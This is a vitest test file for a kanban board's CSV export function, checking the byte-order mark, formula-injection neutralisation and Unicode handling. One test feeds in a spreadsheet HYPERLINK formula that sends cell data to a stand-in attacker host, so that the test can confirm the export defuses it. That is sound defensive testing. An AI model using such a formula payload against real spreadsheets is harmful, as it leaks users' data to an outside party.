import { describe, expect, it, vi } from 'vitest'
import { buildCsv } from './board-export'

vi.mock('file-saver', () => ({ saveAs: vi.fn() }))

const columns = [{ id: 'col-1', name: 'To do' }]

const card = (title: string, description: string | null = null) => ({
  column_id: 'col-1',
  title,
  description,
  color: null,
  due_date: null,
  position: 0,
})

const fieldBodies = (csv: string) =>
  csv
    .split('\n')
    .slice(1)
    .flatMap((row) => row.split(',"').map((field) => field.replace(/^"/, '')))

describe('buildCsv', () => {
  it('starts with a UTF-8 byte-order mark', () => {
    expect(buildCsv(columns, [card('Ship it')]).startsWith('\ufeff')).toBe(true)
  })

  it('neutralises leading formula characters', () => {
    const csv = buildCsv(columns, [
      card('=1+1'),
      card('=HYPERLINK("https://attacker.example/?d="&A1,"Click for details")'),
      card('+1', '-1'),
      card('@SUM(A1)', '\tlead'),
    ])

    for (const body of fieldBodies(csv)) {
      expect(body).not.toMatch(/^[=+\-@\t\r]/)
    }
  })

  it('keeps the neutralised value readable', () => {
    expect(buildCsv(columns, [card('=1+1')])).toContain(`"'=1+1"`)
  })

  it('round-trips non-ASCII text unchanged', () => {
    expect(buildCsv(columns, [card('Café ☕ — résumé review')])).toContain(
      '"Café ☕ — résumé review"'
    )
  })
})
